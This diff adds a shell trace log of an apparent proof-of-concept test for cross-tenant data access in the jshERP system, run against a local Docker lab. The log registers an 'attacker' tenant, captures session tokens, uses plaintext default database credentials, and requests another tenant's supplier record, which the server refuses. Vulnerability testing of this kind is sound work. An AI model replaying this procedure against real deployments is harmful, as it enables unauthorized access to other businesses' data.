@@ -1,0 +1,134 @@
++ set -e
++ BASE=http://127.0.0.1:9999/jshERP-boot
++ P=e10adc3949ba59abbe56e057f20f883e
++ ORGAN_ID=74
+++ date +%s
++ ATTACKER=pocx1772428485
++ step '1) 查看目标供应商记录（数据库状态）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 1) 查看目标供应商记录（数据库状态）'
+[STEP] 1) 查看目标供应商记录（数据库状态）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+74	供应商5	供应商	5.000000	0.000000	63
++ step '2) 创建跨租户攻击账号（自动注册新租户）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 2) 创建跨租户攻击账号（自动注册新租户）'
+[STEP] 2) 创建跨租户攻击账号（自动注册新租户）
++ echo ==============================
+==============================
++ REG_PAYLOAD='{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'
++ echo 'attacker login_name: pocx1772428485'
+attacker login_name: pocx1772428485
++ echo '+ docker exec -i jsherp33-app sh -lc "curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-"'
++ docker exec -i jsherp33-app sh -lc "curl -s -X POST 'http://127.0.0.1:9999/jshERP-boot/user/registerUser' -H 'Content-Type: application/json' --data-binary @-"
+++ printf %s '{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'
+++ docker exec -i jsherp33-app sh -lc 'curl -s -X POST '\''http://127.0.0.1:9999/jshERP-boot/user/registerUser'\'' -H '\''Content-Type: application/json'\'' --data-binary @-'
++ REG_RESP='{"msg":"操作成功","code":200}'
++ echo 'register response: {"msg":"操作成功","code":200}'
+register response: {"msg":"操作成功","code":200}
++ echo '{"msg":"操作成功","code":200}'
++ grep -q '"code":200'
++ step '3) 查看攻击账号对应的用户与租户（数据库状态）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 3) 查看攻击账号对应的用户与租户（数据库状态）'
+[STEP] 3) 查看攻击账号对应的用户与租户（数据库状态）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='pocx1772428485'; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='pocx1772428485';\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,login_name,tenant_id,ismanager,status FROM jsh_user WHERE login_name='\''pocx1772428485'\''; SELECT tenant_id,login_name,user_num_limit,expire_time FROM jsh_tenant WHERE login_name='\''pocx1772428485'\'';\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+141	pocx1772428485	141	1	0
+141	pocx1772428485	1000000	2034-05-19 13:14:46
++ step '4) 登录获取 jsh 与攻击者 token'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 4) 登录获取 jsh 与攻击者 token'
+[STEP] 4) 登录获取 jsh 与攻击者 token
++ echo ==============================
+==============================
+++ login_token jsh
+++ user=jsh
+++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"jsh","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
+++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
++ TOKEN_JSH=98396cffac234989a2747813468ca304_63
+++ login_token pocx1772428485
+++ user=pocx1772428485
+++ docker exec jsherp33-app sh -lc 'curl -s -X POST http://127.0.0.1:9999/jshERP-boot/user/login -H '\''Content-Type: application/json'\'' -d '\''{"loginName":"pocx1772428485","password":"e10adc3949ba59abbe56e057f20f883e"}'\'''
+++ sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
++ TOKEN_ATTACK=0dec4e43ca6c4035b07a7ac716191a18_141
++ echo 'jsh token: 98396cffac234989a2747813468ca304_63'
+jsh token: 98396cffac234989a2747813468ca304_63
++ echo 'attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141'
+attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141
++ '[' -n 98396cffac234989a2747813468ca304_63 ']'
++ '[' -n 0dec4e43ca6c4035b07a7ac716191a18_141 ']'
++ step '5) 基线请求：租户 owner(jsh) 读取该 organId'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 5) 基线请求：租户 owner(jsh) 读取该 organId'
+[STEP] 5) 基线请求：租户 owner(jsh) 读取该 organId
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
++ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
++ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 98396cffac234989a2747813468ca304_63'"
++ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 98396cffac234989a2747813468ca304_63'\''"'
+{"code":200,"data":{"needDebt":0,"eachAmount":0.000000,"finishDebt":0.000000}}+ step '6) 攻击请求：跨租户攻击者读取同一个 organId'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 6) 攻击请求：跨租户攻击者读取同一个 organId'
+[STEP] 6) 攻击请求：跨租户攻击者读取同一个 organId
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
++ echo '+ docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
++ docker exec jsherp33-app sh -lc "curl -s 'http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74' -H 'X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'"
++ sh -c 'docker exec jsherp33-app sh -lc "curl -s '\''http://127.0.0.1:9999/jshERP-boot/supplier/getBeginNeedByOrganId?organId=74'\'' -H '\''X-Access-Token: 0dec4e43ca6c4035b07a7ac716191a18_141'\''"'
+{"code":500,"data":"获取数据失败"}+ step '7) 调用后再次查看目标供应商记录（数据库状态）'
++ echo
+
++ echo ==============================
+==============================
++ echo '[STEP] 7) 调用后再次查看目标供应商记录（数据库状态）'
+[STEP] 7) 调用后再次查看目标供应商记录（数据库状态）
++ echo ==============================
+==============================
++ run 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
++ echo '+ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
++ docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""
++ sh -c 'docker exec jsherp33-mysql sh -lc "mysql -N -ujsherp -p123456 -D jsh_erp -e \"SELECT id,supplier,type,begin_need_pay,begin_need_get,tenant_id FROM jsh_supplier WHERE id=74;\""'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+74	供应商5	供应商	5.000000	0.000000	63
++ echo
+
++ echo '[Context]'
+[Context]
++ echo 'jsh token: 98396cffac234989a2747813468ca304_63'
+jsh token: 98396cffac234989a2747813468ca304_63
++ echo 'attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141'
+attacker token: 0dec4e43ca6c4035b07a7ac716191a18_141
++ echo 'attacker login: pocx1772428485'
+attacker login: pocx1772428485
